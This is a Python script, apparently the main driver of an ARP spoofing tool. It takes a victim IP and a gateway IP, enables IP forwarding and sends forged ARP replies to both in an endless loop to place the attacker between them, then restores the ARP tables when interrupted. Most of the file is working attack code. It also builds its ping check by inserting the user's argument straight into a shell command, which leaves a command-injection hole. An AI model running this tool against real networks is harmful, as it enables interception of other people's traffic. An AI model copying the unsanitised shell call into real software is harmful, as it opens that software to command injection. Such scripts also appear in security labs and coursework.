""" Orchestrates the ARP Spoofing by taking arguments, validating them and calling the spoofing modules """

#!/usr/bin/env python

import time
import sys, os
import argparse
from termcolor import  colored
import subprocess

def root_check():
    if os.geteuid() == 0:
        pass
    else:
        print("[-] Please run as root")
        sys.exit()

def program_arguments():
    parser = argparse.ArgumentParser(description="*** ARP Spoofer ***", usage=argparse.SUPPRESS,
                                     epilog="Usage: %(prog)s <victim_ip> <gateway_ip> . . . For examlpe: main.py 10.0.2.4 10.0.2.1")
    parser.add_argument("victim", help="IP address of the victim machine")
    parser.add_argument("gateway", help="IP address of the access point")
    option = parser.parse_args()

    # Validating IP (Doing a ping test and verifying if reachable)
    flag=False
    for ip in [option.victim, option.gateway]:
        if subprocess.call("ping %s -c 2" %ip, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
            pass
        else:
            print("[-] {} not reachable".format(ip))
            flag=True

    if flag == True:
        print("Please check your input\nUse -h or --help for more information")
        sys.exit()
    else:
        return option

def loader():
    for count in range(3):
        print(".", end=' ', flush=True)
        time.sleep(1)
    print("Packets sent : %d" % packets_count, end=' ')

try:
    root_check() # Checking if running as root
    option = program_arguments() # Passing and verifying arguments

    from spoof_function import arp_spoof
    from spoof_function import restore
    from spoof_function import IP_forwarding

    IP_forwarding()  # Enabling IP forwarding

    ip_ap = option.gateway
    ip_victim = option.victim

    # Starting the attack
    # Running until stopped manually
    packets_count = 0
    print("\n[+] Setting up an ARP Spoofing session")
    time.sleep(0.5)
    print("[+] Session " +  colored("<ACTIVE>", "green"))
    time.sleep(0.5)
    while True:
        arp_spoof(ip_victim, ip_ap) # To be sent to victim
        arp_spoof(ip_ap, ip_victim) # To be sent to access point
        packets_count += 2
        print("\r[+] Sending Packets", end=' ')
        loader()
        time.sleep(2) # Waiting for 2 sec interval before sending the ARP response every time, inorder not to flood the network.

except KeyboardInterrupt:
    # Restoring the flow, sending the right information to target and access point, inorder to stop spoofing
    # By default this will be restored on its own after a while, but we do this just as a precautionary measure
    restore(ip_victim, ip_ap)
    restore(ip_ap, ip_victim)
    print("\n\n[-] Resetting ARP tables")
    time.sleep(0.5)
    print("[-] Session " + colored("<DISCONNECTED>", "red"))
    time.sleep(0.5)
    print("[-] Quitting Program")
    sys.exit()
